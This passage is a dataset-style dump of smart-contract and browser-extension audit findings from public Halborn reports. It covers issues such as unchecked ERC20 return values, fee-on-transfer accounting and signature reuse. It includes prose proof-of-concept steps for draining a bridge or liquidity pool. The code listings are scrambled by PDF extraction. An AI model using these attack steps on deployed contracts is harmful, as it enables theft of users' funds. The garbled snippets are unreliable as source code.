        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf",
        "body": "During the assessment, Halborn observed that the extension does not check Specifically, the on: if the events it listens for are trustworthy. click events that call the handleConfirm() and handleReject functions in Confirm.svelte do not perform this check. The isTrusted property states if the event was generated purely from user actions and not synthetically created by an attacker. The severity of this vulnerability has been downgraded to INFORMATIONAL since the attack vector would require someone to already be able to perform an XSS attack on the extension popup window. However, it is good practice to always perform this check on events. This can add security in the future when the extension listens for events generated by the website. As good coding practice, MessageEvents should also check this property, and they are listed below. Proof of Concept: The following Svelte snippet exposes two functions, each called by a button. The first button directly calls handleClick() and the second calls triggerClick(), which synthetically clicks the first button, which in turn calls handleClick(): Listing 5: Trusted/untrusted events handling 1 < script > 2 3 4 5 6 } function handleClick ( event ) { console . log ( ' handleClick called '); console . log ( event . isTrusted ) alert ( ' clicked ') 25 console . log ( ' triggerClick called first '); var btn = document . getElementById ( \" myBtn \" ); function triggerClick () { btn . click () ; } 7 8 9 10 11 12 13 </ script > 14 15 < button id = \" myBtn \" on : click ={ handleClick }> 16 17 </ button > 18 < hr /> 19 < button on : click ={ triggerClick }> 20 21 </ button > Click me Untrusted Click me Trusted The image below shows the isTrusted property of each event: 26 Figure 4: A trusted and an untrusted event Code Location: Listing 6 1 REDACTED CVSS Vector:  AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N 27 Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to check if each event processed is trusted: Listing 7 1 REDACTED Remediation Plan: FUTURE RELEASE: The Playground Labs team intend to address this finding in a future release. 28 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNSAFE HANDLING OF ERC20 TRANSFER RESULTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the bridgeOut function in the CATERC20Proxy con- tract does not verify the return value of the transferFrom function call, which facilitates the token transfer from the caller to the contract. Some tokens (e.g., ZRX) return false instead of reverting in the event of failure or insufficient balance. Setting up the contract with such tokens could enable users to transfer funds to other chains without transferring any tokens to the CATERC20Proxy contract. In these cases, by exploiting this vulnerability, a malicious user can extract the funds from the con- tract by depositing a huge amount with actual funds, then withdrawing it from the contract. It was also identified that the CATERC20Proxy contract indirectly uses the ERC20 interface for the transferFrom function calls, and expects the function to return a boolean value. However, the transferFrom function of some ERC-20 tokens (e.g., USDT, BNB) does not return any values. If the CATERC20Proxy contract is configured with such tokens, then the transferFrom calls reverts, preventing the users from depositing or with- drawing. Code Location: The SafeERC20 wrapper is not used for transferring tokens from the de- positor in the bridgeOut function of the CATERC20Proxy contract: Listing 1: contracts/ERC20/CATERC20Proxy.sol 63  contract 64  normalizedAmount ); // Transfer in contract and lock the tokens in this nativeAsset () . transferFrom ( _msgSender () , address ( this ) , 21 The transferFrom function of some tokens (e.g., ZRX) return false instead of reverting in the event of failure or insufficient balance: Listing 2: The implementation of the transferFrom function of the ZRX token if ( balances [ _from ] >= _value && allowed [ _from ][ msg . sender function transferFrom ( address _from , address _to , uint _value ) 74  returns ( bool ) { 75  ] >= _value && balances [ _to ] + _value >= balances [ _to ]) { 76 77 78 79 80 81 82 balances [ _to ] += _value ; balances [ _from ] -= _value ; allowed [ _from ][ msg . sender ] -= _value ; Transfer ( _from , _to , _value ); return true ; } else { return false ; } } The nativeAsset in the CATERC20Proxy contract uses the IERC20Extended interface: Listing 3: contracts/ERC20/Getters.sol 51 52 53 function nativeAsset () public view returns ( IERC20Extended ) { return IERC20Extended ( _state . nativeAsset ); } The IERC20Extended interface extends the IERC20 interface: Listing 4: contracts/interfaces/IERC20Extended.sol 6 interface IERC20Extended is IERC20 { 7 8 } function decimals () external view returns ( uint8 ); 22 The IERC20 interface excepts a return value from the transferFrom func- tion: Listing 5: @openzeppelin/contracts/token/ERC20/IERC20.sol 77 78 79 80 81 function transferFrom ( address from , address to , uint256 amount ) external returns ( bool ); However, the transferFrom function of some tokens (e.g., USDT) does not return any value, which would cause the contract to revert: Listing 6: The ERC20 Interface Used By USDT function allowance ( address owner , address spender ) public function transferFrom ( address from , address to , uint value ) function approve ( address spender , uint value ) public ; event Approval ( address indexed owner , address indexed spender , 77 contract ERC20 is ERC20Basic { 78  constant returns ( uint ); 79  public ; 80 81  uint value ); 82 } Proof of Concept: 1. A CATERC20Proxy is deployed on the Mainnet, configured with the ZRX token. 2. A malicious user exploits the lack of SafeERC20 wrapper and deposits tokens to the bridge without actually depositing any funds. 3. The deposit is successful and the LogMessagePublished event is emit- ted because the ZRX token returns false instead of reverting, and the CATERC20Proxy contracts do not check the return value. 4. The malicious user then withdraws their token balance from the CATERC20Proxy contract. 5. The deficit of funds prevents other users from withdrawing their ZRX tokens from the CATERC20Proxy contract. 23 The following example is a demonstration of a successful ZRX deposit with alice, who holds zero ZRX tokens: 1. A CATERC20Proxy is deployed on the Mainnet, configured with the USDT token. 2. The users try to deposit. However, they cannot deposit because the BridgeOut function reverts every time they call it. 24 The following example demonstrates the revert of the BridgeOut function when the contract was configured with the USDT token: BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:H/Y:N/R:N/S:U (9.4) Recommendation: It is recommended to use OpenZeppelins SafeERC20 wrapper and the safeTransferFrom function to transfer the payment tokens from the callers to the contract. 25 Remediation Plan: SOLVED: The Nexa team solved the issue in commit 912abf2 by using the OpenZeppelins SafeERC20 wrapper and the safeTransferFrom function to transfer the payment tokens from the callers to the contract. 26 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Critical"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the bridgeOut function in the CATERC20Proxy con- tract assumes that the transferFrom call transfers the full amount of tokens. This may not be true if the tokens being transferred are transfer- on-fee tokens, causing the received amount to be lesser than the accounted amount, resulting in an increasing deficit of funds in the CATERC20Proxy contract. If the contract does not have the full token amounts, the fol- lowing bridgeIn function calls may revert because of insufficient funds, preventing users from withdrawing their full balances. The CATERC20Proxy contract also assumes that its native asset token balances does not change over time without any token transfers, which not be true if the native asset is deflationary/inflationary/rebasing tokens. For example, the supply of AMPL (Ampleforth) tokens automatically increases or decreases every 24 hours to maintain the AMPL target price. In these cases, the contract might not have the full token amounts and the following bridgeIn function calls may revert because of insufficient funds. Code Location: Listing 7: contracts/ERC20/CATERC20Proxy.sol (Lines 64,67) // Transfer in contract and lock the tokens in this nativeAsset () . transferFrom ( _msgSender () , address ( this ) , 63  contract 64  normalizedAmount ); 65 66  CATERC20Structs . CrossChainPayload ({ 67 68 amount : normalizedAmount , tokenAddress : tokenAddress , CATERC20Structs . CrossChainPayload memory transfer = 27 69 70 71 72 tokenChain : tokenChain , toAddress : recipient , toChain : recipientChain }) ; Proof of Concept: Using a transfer-on-fee token: 1. A CATERC20Proxy is deployed on the Mainnet configured with a transfer-on-fee token. 2. The CATERC20Proxy contract is incorrectly accounting for the de- posits. 3. The users withdraw more funds than their actual deposit, resulting in an increasing deficit of funds in the CATERC20Proxy contract. 4. The deficit of funds prevents other users from withdrawing their tokens from the CATERC20Proxy contract. Using a deflationary token: 1. A CATERC20Proxy is deployed on the Mainnet configured with a defla- tionary token. 2. The CATERC20Proxy contract is incorrectly accounting for the deposits as the token balance of the contract decreases over time. 3. The users withdraw their original deposit amount, resulting in an increasing deficit of funds in the CATERC20Proxy contract. 4. The deficit of funds prevents other users from withdrawing their tokens from the CATERC20Proxy contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (5.0) 28 Recommendation: It is recommended to get the exact received amount of the tokens being transferred by calculating the difference of the token balance before and after the transfer to handle transfer-on-fee tokens. It is recommended to state in the documentation that the contracts are incompatible with deflationary/inflationary/rebasing tokens. Remediation Plan: SOLVED: The Nexa team solved the issue in commits 970a9d6, 12163c3 and A comment with a 23e9f7e by calculating the exact received amounts. disclaimer was added in the CATERC20Proxy contract to warn users about the incompatibility with deflationary or inflationary tokens. 29 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "RECIPIENT CHAIN ID IS NOT VALIDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Users can bridge tokens to different chains using the BridgeOut functions of the CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts. However, it was identified that these functions do not validate the recipient recipientChain parameter, containing the recipient chain ID. This presents a risk, as users may inadvertently send tokens to chains where the requisite bridge contracts are absent (e.g., the users confuse the Wormhole chain ID with the network chain ID). In such instances, the users would not be able to withdraw, and their tokens would remain locked in the contract until the requisite bridge contracts are not deployed. Code Location: The recipientChain parameters are not validated in the bridgeOut func- tions. For example, in the CATERC20 contract: Listing 8: contracts/ERC20/CATERC20.sol function bridgeOut ( uint256 amount , uint16 recipientChain , bytes32 recipient , uint32 nonce 52 53 54 55 56 57 58 59 60 61  publish message \"); ) external payable returns ( uint64 sequence ) { require ( isInitialized () == true , \" Not Initialized \"); uint256 fee = wormhole () . messageFee () ; require ( msg . value >= fee , \" Not enough fee provided to Note that an allowlist was implemented for the bridgeIn function. 30 Listing 9: contracts/ERC20/CATERC20.sol (Line 102) 100 101 102 require ( bytesToAddress ( vm . emitterAddress ) == address ( this ) || tokenContracts ( vm . emitterChainId ) == vm .  emitterAddress , 103 104 ); \" Invalid Emitter \" BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:C/Y:N/R:F/S:U (2.5) Recommendation: It is recommended to create an allowlist and use it inside the bridgeOut function to only allow token transfers to supported chains. Remediation Plan: SOLVED: The Nexa team solved the issue in commit 252f468 by allowing token transfers to supported chains only. 31 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF CHAIN FORK VERIFICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the bridgeIn and bridgeOut functions of the CATERC20 , CATERC20Proxy, CATERC721 and CATERC721Proxy contracts do not check whether the current blockchain is a fork or not. Executing the bridgeIn or the bridgeOut functions on a forked chain may result in the users receiving the transferred tokens both from the original and on the forked chains. Code Location: For example, in the CATERC20 contract, the bridgeIn function does not check whether the current blockchain is a fork or not: Listing 10: contracts/ERC20/CATERC20.sol function bridgeIn ( bytes memory encodedVm ) external returns ( require ( isInitialized () == true , \" Not Initialized \"); ( IWormhole . VM memory vm , bool valid , string memory reason ) 93  bytes memory ) { 94 95 96  = wormhole () . parseAndVerifyVM ( 97 98 99 100 101 102 ); require ( valid , reason ); require ( encodedVm bytesToAddress ( vm . emitterAddress ) == address ( this ) || tokenContracts ( vm . emitterChainId ) == vm .  emitterAddress , 103 104 105 106 \" Invalid Emitter \" ); CATERC20Structs . CrossChainPayload memory transfer =  decodeTransfer ( vm . payload ); 107 address transferRecipient = bytesToAddress ( transfer .  toAddress ); 108 32 109 require (! isTransferCompleted ( vm . hash ) , \" transfer already  completed \"); 110 111 112 setTransferCompleted ( vm . hash ); require ( transfer . toChain == wormhole () . chainId () , \" invalid  target chain \" ); BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to save the chain ID in the contract and verify in the bridgIn function that its value matches with block.chainid. Remediation Plan: SOLVED: The Nexa team solved the issue in commit ad7853f by checking the chain ID. 33 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "TRANSFER AMOUNTS ARE NOT NORMALIZED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the bridgeOut and bridgeIn functions of the CATERC20 and CATERC20Proxy contracts do not normalize and denormalize the transfer Since transfer amounts are not amounts of the cross-chain messages. normalized and denormalized, the users lose funds if the bridges sending and receiving tokens use different decimals. Note that on some blockchains, tokens are limited to have a maximum of 8 decimal places, which may require the transfer amounts to be normalized. However, the current implementations of the contracts are intended to be only used on EVM compatible chains. Code Location: Instead of calculating the normalizedAmount in the bridgeOut function, the transfer amount is rounded by first normalizing and then denormalizing it. This operation is used in other contracts to avoid any loss of deposited funds due to the decimal shift, and the actual normalization is missing from the function. For example, in the CATERC20 contract: Listing 11: contracts/ERC20/CATERC20.sol uint256 normalizedAmount = deNormalizeAmount ( normalizeAmount ( amount , decimals () ) , decimals () ); _burn ( _msgSender () , normalizedAmount ); 64 65 66 67 68 69 70  CATERC20Structs . CrossChainPayload ({ 71 72 73 74 amount : normalizedAmount , tokenAddress : tokenAddress , tokenChain : tokenChain , toAddress : recipient , CATERC20Structs . CrossChainPayload memory transfer = 34 75 76 }) ; toChain : recipientChain The same issue can be identified in the nativeAmount calculation of the bridgeIn functions. For example, in the CATERC20 contract: Listing 12: contracts/ERC20/CATERC20.sol uint256 nativeAmount = deNormalizeAmount ( normalizeAmount ( transfer . amount , decimals () ) , decimals () ); _mint ( transferRecipient , nativeAmount ); 114 115 116 117 118 119 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to examine whether there is a need to normalize the token transfer amounts. If normalization is not necessary, it is recommended to remove the unnecessary code from the bridgeOut functions. Remediation Plan: SOLVED: The Nexa team solved the issue in commits 0cbbb8c and 4e08af4 by normalizing the transfer amounts. 35 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "SIGNATURES CAN BE REUSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the CATERC20Governance and CATERC721Governance contracts, custo- dians authorized by signatures can also execute the registerChain, registerChains and updateFinality functions. The signature can only be used by the specified custodian until its validity period. However, it was identified that signatures can be reused arbitrarily times until they are not expired. It is also impossible to revoke the validity of the signatures. If the custodian accounts get compromised, the attacker can execute the registerChain, registerChains and updateFinality functions until the signature is not expired. Code Location: The onlyOwnerOrOwnerSignature modifier does not check whether the sig- nature has been used or revoked. For example, in the CATERC20Governance contract: Listing 13: contracts/ERC20/Governance.sol (Lines 68-73) modifier onlyOwnerOrOwnerSignature ( CATERC20Structs . SignatureVerification memory if ( _msgSender () == owner () ) { _; ) { } else { 36 37  signatureArguments 38 39 40 41 42 43 44  signatureArguments . validTill ) 45 46 47  \" custodian can call only \" ); keccak256 ( ) bytes32 encodedHashData = prefixed ( abi . encodePacked ( signatureArguments . custodian , ); require ( signatureArguments . custodian == _msgSender () , 36 require ( signatureArguments . validTill > block . timestamp verifySignature ( encodedHashData , require ( 48  , \" signed transaction expired \"); 49 50  signatureArguments . signature , owner () ) , 51 52 53 54 55 \" unauthorized signature \" ); _; } } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to extend the onlyOwnerOrOwnerSignature modifier to also check if the signature has been used or revoked. Remediation Plan: PENDING: The Nexa team updated the code to prevent signature reuse in commit ebc0400. The Nexa team will implement the signature revoke feature in a future release. 37 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF EMERGENCY STOP PATTERN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts do not implement any kind of emergency stop pattern. Such a pattern allows the project team to pause crucial functionalities while being in a state of emergency, e.g., being under an adversary attack. The most prevalent application of the emergency stop pattern is the Pausable contract from the OpenZeppelins library. If the emergency stop pattern is not used, functions such as bridgeOut, bridgeIn cannot be temporarily disabled. BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to use the emergency stop pattern in the contracts. Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 38 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "MISTAKENLY SENT TOKENS AND ETHER CANNOT BE RECOVERED FROM THE CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the CATERC20, CATERC20Proxy, CATERC721 and sweep/recover missing CATERC721Proxy accidental token and Ether transfers. Mistakenly sent tokens and Ether are locked in the contracts indefinitely. contracts functions are to BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to add a function to recover accidental token and Ether transfers. Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 39 ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The owner of the contract is usually the account that deploys the con- tract. As a result, the owner can perform some privileged functions. In the CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts, the renounceOwnership function can be used to renounce the owner permis- sion. Renouncing ownership would result in the contract having no owner, eliminating the ability to call privileged functions. Code Location: The contracts are inherited from the Ownable contract, and therefore, their ownership can be renounced with the renounceOwnership function: Listing 14: openzeppelin-contracts/contracts/access/Ownable.sol function renounceOwnership () public virtual onlyOwner { _transferOwnership ( address (0) ) ; } 61 62 63 BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (2.0) Recommendation: It is recommended that the owner cannot call renounceOwnership without first transferring ownership to another address. In addition, if a multi- signature wallet is used, the call to the renounceOwnership function should be confirmed for two or more users. 40 Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 41 4.10 (HAL-10) SINGLE STEP OWNERSHIP TRANSFER PROCESS - LOW (2.0) ",
        "labels": [
            "Halborn",
            "Nexa_CAT_ERC_Standards",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISCALCULATION OF PENDING DELTA LIQUIDITY LEADS TO AN INCORRECT HEDGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _getLiquidity function in the LiquidityPool contract miscalculates the value of pendingDeltaLiquidity when pendingDelta > freeLiquidity. Consequently, in the aforementioned situation, the liquidity pool cannot be used for withdrawals nor use the available liquidity for delta hedging, as shown in the following comparison table: Scenario 2 shows that pendingDeltaLiquidity, the amount is used for delta hedging, could be up to 20 instead of just 5. This latter value is the incorrect amount proposed by Scenario 1. Code Location: Listing 1: LiquidityPool.sol (Line 863) 854 uint usedQuote = totalOutstandingSettlements + totalQueuedDeposits  + lockedCollateral . quote + pendingBaseValue ; 855 856 uint totalQuote = quoteAsset . balanceOf ( address ( this )) ; 857 858 liquidity . freeLiquidity = totalQuote > ( usedQuote + 13  reservedTokenValue ) ? totalQuote - ( usedQuote + reservedTokenValue ) : 0; 859 860 861 862 // ensure pendingDelta <= liquidity . freeLiquidity 863 liquidity . pendingDeltaLiquidity = liquidity . freeLiquidity >  pendingDelta ? pendingDelta : liquidity . freeLiquidity ; 864 liquidity . freeLiquidity -= liquidity . pendingDeltaLiquidity ; 865 866 liquidity . burnableLiquidity = totalQuote > ( usedQuote +  pendingDelta ) ? totalQuote - ( usedQuote + pendingDelta ) : 0; Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the pendingDeltaLiquidity calculation to take advantage of current balance in the liquidity pool for more accurate delta hedging. Remediation plan: SOLVED: The issue was fixed in commit d8d2e902c6d368313d9e04bec40c21fbf70b870b. 14 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "COLLATERAL CAN BE UPDATED IN SETTLED BOARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _doTrade and addCollateral functions from OptionMarket contract allow updating collateral on positions, even if the board is settled. As a consequence, unexpected situations may happen:  The added collateral could be forever stuck in ShortCollateral con- tract and the liquidity pool would never get it.  If the result is not favorable for users once a board is settled, they can reduce their collateral and negatively affect the liquidity of the protocol.  Even in some edge scenarios of volatility, the collateral on posi- tions can be reduced to less than expected. Code Location: addCollateral function will update positions collateral without previ- ously verifying if board is settled: Listing 2: OptionMarket.sol (Line 511) 508 function addCollateral ( uint positionId , uint amountCollateral )  external nonReentrant notGlobalPaused { 509 510 int pendingCollateral = SafeCast . toInt256 ( amountCollateral ); OptionType optionType = optionToken . addCollateral ( positionId ,  amountCollateral ); _routeUserCollateral ( optionType , pendingCollateral ); 511 512 } 15 When opening / closing a position, if trade amount is 0, _doTrade function wont verify is board is settled and will return earlier, which allows updating positions collateral: Listing 3: OptionMarket.sol (Lines 728,732) 727 // don 't engage AMM if only collateral is added / removed 728 if ( trade . amount == 0) { 729 730 if ( expectedAmount != 0) { revert TradeIterationsHasRemainder ( address ( this ) , iterations ,  expectedAmount , 0, 0) ; } return (0 , 0, 0, new OptionMarketPricer . TradeResult [](0) ); 731 732 733 } 734 735 if ( board . frozen ) { 736 737 } 738 if ( board . expiry < block . timestamp ) { 739 revert BoardIsFrozen ( address ( this ) , board . id ); revert BoardExpired ( address ( this ) , board . id , board . expiry ,  block . timestamp ); Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the logic of addCollateral and _doTrade functions to revert if a board is settled. Remediation plan: SOLVED: The issue was fixed in the following commits:  056017961c89f0800eec2dfd5bc559a591b68aae  d8d2e902c6d368313d9e04bec40c21fbf70b870b 16 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "LIQUIDITY POOL COULD RUN OUT OF SUSD TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When closing a position long call, the _maybeExchangeBase function is called with the argument revertBuyOnInsufficientFunds set to false. As a consequence, the liquidity pool will be able to swap sUSD for sETH without limits and could eventually run out of sUSD tokens. This situation could affect some relevant operations such as withdrawal, premium payment, settlement, etc. Proof of Concept: Initial liquidity info for the test: The attacker opens a long call position of 120 sETH. There is a big differ- ence between lockedCollateral.base and sETH balance because of (HAL-04) DIFFERENCES BETWEEN LOCKED COLLATERAL AND SETH BALANCE ARE NOT ADEQUATELY CAPPED: 17 Because of the difference, the owner decides to set maxFeePaid = MAX_UINT to enable sETH repurchase. On the other hand, a user withdraws sUSD from liquidity pool. The image shows liquidity info after withdrawal: Finally, the attacker closes the 82.6 sETH long call position: Since the swap is not limited by any parameter, the protocol uses all available sUSD. In the end, the new sUSD balance is almost 0 (0.29037... in the example): 18 Code Location: Listing 4: LiquidityPool.sol (Line 917) 913 ( uint quoteSpent , uint baseReceived ) = synthetixAdapter .  exchangeToExactBaseWithLimit ( exchangeParams , address ( optionMarket ) , amountBase , revertBuyOnInsufficientFunds ? freeLiquidity : type ( uint ). max 914 915 916 917 918 ); 919 emit BasePurchased ( quoteSpent , baseReceived ); Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to only allow the use of freeLiquidity for swapping when closing a position. Another alternative could be to allow an amount greater than freeLiquidity but within a predefined threshold. 19 Remediation plan: SOLVED: The issue was fixed in commit d8d2e902c6d368313d9e04bec40c21fbf70b870b. With the update to the _getLiquidity function in the LiquidityPool contract, this attack vector is not feasible. 20 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "DIFFERENCES BETWEEN LOCKED COLLATERAL AND SETH BALANCE ARE NOT ADEQUATELY CAPPED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The differences between lockedCollateral.base and sETH balance in the These liquidity pool are not limited to opening long call positions. differences could create distorted liquidity values with the following consequences:  In some scenarios, the liquidity pool can run out of sUSD, which could affect some operations such as withdrawals, payment of premiums, settlement, etc. See (HAL-03) LIQUIDITY POOL COULD RUN OUT OF SUSD TOKENS for more details.  Distorted liquidity values will erroneously affect protocol deci- more liquidity to withdraw, less amount to sions, for example: hedge, etc. See Proof of Concept below for more details. Proof of Concept: Initial situation for the test: Scenario 1: quoteBaseFeeRate <= maxFeePaid The user opens a long call position of 100 sETH. Due to the swap, sETH balance and lockedCollateral.base have the same value: 21 Scenario 2: quoteBaseFeeRate > maxFeePaid The user opens a long call position 100 sETH. Because there is no swap, differences between sETH balance and lockedCollateral.base will increase: Comparative table of liquidity info between both scenarios: 22 Scenario 2 shows that freeLiquidity and burnableLiquidity have increased, but pendingDeltaLiquidity has decreased. These distorted liquidity values (compared to Scenario 1) will erroneously affect protocol decisions, e.g: more liquidity to withdraw, less amount to hedge, etc. Code Location: lockBase function increases the value of lockedCollateral.base and then calls _maybeExchangeBase: Listing 5: LiquidityPool.sol (Lines 554,555) 549 function lockBase ( uint amount , 550 SynthetixAdapter . ExchangeParams memory exchangeParams , 551 552 uint freeLiquidity 553 ) external onlyOptionMarket { 554 555 556 557 } lockedCollateral . base += amount ; _maybeExchangeBase ( exchangeParams , freeLiquidity , true ); emit BaseLocked ( amount , lockedCollateral . base ); _maybeExchangeBase function could return earlier without swapping, which creates a big difference between lockedCollateral.base and sETH balance: Listing 6: LiquidityPool.sol (Lines 898,901,911) 898 } else if ( currentBaseBalance < lockedCollateral . base ) { 899 900 901 902 // Buy base for quote uint amountBase = lockedCollateral . base - currentBaseBalance ; if ( exchangeParams . quoteBaseFeeRate > lpParams . maxFeePaid ) { uint estimatedExchangeCost = synthetixAdapter .  estimateExchangeToExactBase ( exchangeParams , amountBase ); 903 if ( revertBuyOnInsufficientFunds && estimatedExchangeCost >  freeLiquidity ) { 904 905 906 907 revert InsufficientFreeLiquidityForBaseExchange ( address ( this ) , amountBase , estimatedExchangeCost , 23 908 909 910 911 912 freeLiquidity ); } return ; } Risk Level: Likelihood - 5 Impact - 3 Recommendation: It is recommended not to allow opening positions if the liquidity pool cannot get enough sETH, even after trying to swap. Another alternative could be to allow these transactions as long as the difference between sETH balance and lockedCollateral.base does not exceed a predefined threshold. Remediation plan: PARTIALLY SOLVED: Commit d8d2e902c6d368313d9e04bec40c21fbf70b870b par- tially fixes this security issue by not allowing the liquidity pool to run out of sUSD. 24 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "SKEW UPDATE COULD CREATE DATA INCONSISTENCIES WITH GWAV ORACLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _addNewStrikeToStrikeCache and _updateStrikeSkew functions of the OptionGreekCache contract update strikeSkewGWAV with the value of a new skew. If this new skew is outside the gwavSkewFloor / gwavSkewCap range, strikeSkewGWAV will store a capped skew (not the actual value), which feeds the GWAV oracle inconsistent data. Code Location: Listing 7: OptionGreekCache.sol (Lines 408,420) OptionBoardCache storage boardCache , uint strikeId , uint strikePrice , uint skew 404 function _addNewStrikeToStrikeCache ( 405 406 407 408 409 ) internal { 410 // This is only called when a new board or a new strike is added  , so exposure values will be 0 411 412 413 414 415 416 417 418 419 420 StrikeCache storage strikeCache = strikeCaches [ strikeId ]; strikeCache . id = strikeId ; strikeCache . strikePrice = strikePrice ; strikeCache . skew = skew ; strikeCache . boardId = boardCache . id ; emit StrikeCacheUpdated ( strikeCache ); strikeSkewGWAV [ strikeId ]. _initialize ( _max ( _min ( skew , greekCacheParams . gwavSkewCap ) ,  greekCacheParams . gwavSkewFloor ) , 421 422 ); block . timestamp 25 Listing 8: OptionGreekCache.sol (Lines 862,865) OptionBoardCache storage boardCache , StrikeCache storage strikeCache , uint newSkew 857 function _updateStrikeSkew ( 858 859 860 861 ) internal { 862 strikeCache . skew = newSkew ; 863 864 strikeSkewGWAV [ strikeCache . id ]. _write ( 865 _max ( _min ( newSkew , greekCacheParams . gwavSkewCap ) ,  greekCacheParams . gwavSkewFloor ) , block . timestamp 866 867 ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to revert transactions if the 